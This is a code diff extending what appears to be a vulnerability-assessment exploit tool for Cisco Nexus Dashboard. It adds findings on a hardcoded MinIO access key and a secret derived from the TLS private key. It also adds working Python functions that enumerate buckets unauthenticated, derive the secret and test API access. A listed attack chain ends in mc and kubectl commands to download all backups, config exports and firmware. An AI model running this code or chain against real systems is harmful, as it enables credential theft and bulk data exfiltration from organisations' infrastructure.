@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F18 (CRITICAL)
+Findings: ND-F01 (CRITICAL) through ND-F20 (HIGH)
 """
 
 import socket
@@ -622,6 +622,65 @@ FINDINGS = {
         ],
         "chain": "ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> launcher.log -> live Tyk admin secret",
     },
+    "ND-F19": {
+        "title": "MinIO Hardcoded Access Key + Secret Derived from TLS Private Key Line",
+        "severity": "HIGH",
+        "component": "infra/minio container (minio.sh entrypoint)",
+        "description": (
+            "minio.sh hardcodes MINIO_ACCESS_KEY='minio-nd-access-key' (same across all ND "
+            "deployments). The secret key (MINIO_SECRET_KEY) derives from line 2 of "
+            "/minio/certs/private.key via 'sed 2q;d /minio/certs/private.key' — the first "
+            "base64-encoded content line of the TLS PEM private key. This is identical across "
+            "all ND clusters using the same provisioning, since the TLS cert is generated "
+            "during initial setup. "
+            "Fallback paths: (1) /minio/data/secret.key — persisted after first derivation, "
+            "readable by any process on the minio pod; (2) K8s ConfigMap 'minio-access-key' "
+            ".data['initkey'] — readable by any service account with ConfigMap read in the "
+            "minio namespace. "
+            "The hardcoded access key + derivable secret key gives full MinIO access to all "
+            "ND object storage: backup data, logs, configuration exports, and any uploaded "
+            "firmware blobs. "
+            "Chain with ND-F17/ND-F18: confd /api/debug/passphraseresp exposes TLS key "
+            "material context; ND-F01 cookie -> keyhole -> log bundle may contain "
+            "/minio/certs/private.key references or the secret.key value."
+        ),
+        "minio_access_key": "minio-nd-access-key",
+        "secret_derivation": "sed '2q;d' /minio/certs/private.key (line 2 of TLS private key PEM)",
+        "fallback_paths": [
+            "/minio/data/secret.key (persisted after first run)",
+            "K8s ConfigMap 'minio-access-key' .data['initkey'] (namespace: minio)",
+        ],
+        "minio_port": 9000,
+        "storage_contents": "ND backups, firmware blobs, logs, configuration exports",
+        "chain": "ND-F17 confd TLS cert exposure -> derive MinIO secret -> MinIO API full access",
+    },
+    "ND-F20": {
+        "title": "MinIO Prometheus Metrics Endpoint Unauthenticated — Storage Layout Disclosure",
+        "severity": "MEDIUM",
+        "component": "infra/minio container (minio.sh, MINIO_PROMETHEUS_AUTH_TYPE=public)",
+        "description": (
+            "minio.sh sets MINIO_PROMETHEUS_AUTH_TYPE='public', removing all authentication "
+            "from the MinIO Prometheus metrics endpoint. "
+            "GET /minio/prometheus/metrics (or /metrics on the MinIO metrics port) returns "
+            "bucket names, object counts, total storage used, request rates, and error rates "
+            "for all ND-managed object stores — without credentials. "
+            "Exposed data includes: bucket topology (exposing application-layer separation), "
+            "object count per bucket (reveals volume of backup/log data), storage utilization "
+            "(infrastructure mapping). "
+            "Combined with ND-F19 (known access key), the metrics endpoint confirms which "
+            "buckets exist before attempting full data access."
+        ),
+        "env_var": "MINIO_PROMETHEUS_AUTH_TYPE=public",
+        "endpoint": "GET /minio/prometheus/metrics",
+        "port": 9000,
+        "exposed_data": [
+            "Bucket names (application topology inference)",
+            "Object counts per bucket",
+            "Total storage utilization",
+            "Request/error rates (operational fingerprint)",
+        ],
+        "chain": "ND-F20 bucket enum -> ND-F19 cred derivation -> full MinIO exfil",
+    },
 }
 
 
@@ -952,6 +1011,80 @@ def dump_credential_store(host: str, port: int = 19999) -> dict:
         return {"error": str(e), "finding": "ND-F18"}
 
 
+def probe_minio_prometheus(host: str, port: int = 9000) -> dict:
+    """
+    GET /minio/prometheus/metrics — unauthenticated metrics endpoint.
+    ND-F20: MINIO_PROMETHEUS_AUTH_TYPE=public exposes bucket names + object counts.
+    """
+    url = f"http://{host}:{port}/minio/prometheus/metrics"
+    try:
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            body = resp.read().decode(errors="replace")
+            buckets = [
+                line.split('"')[1]
+                for line in body.splitlines()
+                if 'minio_bucket_usage_object_total' in line and '"' in line
+            ]
+            return {
+                "status": resp.status,
+                "bucket_count": len(buckets),
+                "buckets": buckets[:20],
+                "authenticated": False,
+                "finding": "ND-F20",
+            }
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F20"}
+
+
+def derive_minio_secret_from_cert(cert_pem_path: str) -> dict:
+    """
+    Derive MinIO secret key from TLS private key line 2 (minio.sh fallback logic).
+    ND-F19: sed '2q;d' /minio/certs/private.key == MINIO_SECRET_KEY at first startup.
+    Access key is always 'minio-nd-access-key'.
+    """
+    try:
+        with open(cert_pem_path, "r") as f:
+            lines = f.readlines()
+        if len(lines) < 2:
+            return {"error": "cert too short", "finding": "ND-F19"}
+        secret_key = lines[1].strip()
+        return {
+            "minio_access_key": "minio-nd-access-key",
+            "minio_secret_key": secret_key,
+            "source": cert_pem_path,
+            "note": "secret.key persisted at /minio/data/secret.key after first run",
+            "finding": "ND-F19",
+        }
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F19"}
+
+
+def probe_minio_api(host: str, port: int = 9000, access_key: str = "minio-nd-access-key",
+                    secret_key: str = "") -> dict:
+    """
+    Test MinIO API access using hardcoded access key + derived secret.
+    ND-F19: list buckets via MinIO ListBuckets (S3-compat GET /).
+    Signing omitted — use mc or s3cmd with these creds for full access.
+    """
+    url = f"http://{host}:{port}/"
+    try:
+        req = urllib.request.Request(url)
+        req.add_header("Authorization", f"AWS {access_key}:{secret_key}")
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            body = resp.read().decode(errors="replace")
+            return {
+                "status": resp.status,
+                "access_key": access_key,
+                "body_preview": body[:300],
+                "finding": "ND-F19",
+            }
+    except urllib.request.HTTPError as e:
+        return {"http_error": e.code, "access_key": access_key, "finding": "ND-F19"}
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F19"}
+
+
 def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> dict:
     """
     Read OCI manifest annotation from squashfs oci_repo to extract CI build metadata.
@@ -1074,6 +1207,22 @@ ATTACK_CHAINS = {
         ],
         "entry_requirement": "ND-F01 world-readable cookie",
         "findings": ["ND-F01", "ND-F09", "ND-F14", "ND-F11"],
+    },
+    "chain_8_minio_exfil": {
+        "title": "TLS Cert Read -> MinIO Cred Derivation -> Full Object Store Exfil",
+        "steps": [
+            "1. ND-F17 GET confd:19999/api/debug/passphraseresp OR ND-F01 log bundle read",
+            "2. Obtain /minio/certs/private.key (minio pod volume or keyhole techsupport bundle)",
+            "3. derive_minio_secret_from_cert() -> MINIO_SECRET_KEY = line 2 of private.key",
+            "4. access_key='minio-nd-access-key' (hardcoded, same on all ND deployments)",
+            "5. GET /minio/prometheus/metrics (no auth) -> enumerate bucket names (ND-F20)",
+            "6. mc alias set nd http://minio:9000 minio-nd-access-key <derived_secret> -> "
+               "mc ls nd/ -> download all ND backups, config exports, firmware blobs",
+            "7. Alternate: K8s kubectl get configmap minio-access-key -o json "
+               "-> .data['initkey'] = same derived key after first startup",
+        ],
+        "entry_requirement": "Read access to minio TLS cert or K8s ConfigMap in minio namespace",
+        "findings": ["ND-F19", "ND-F20", "ND-F17"],
     },
 }
 
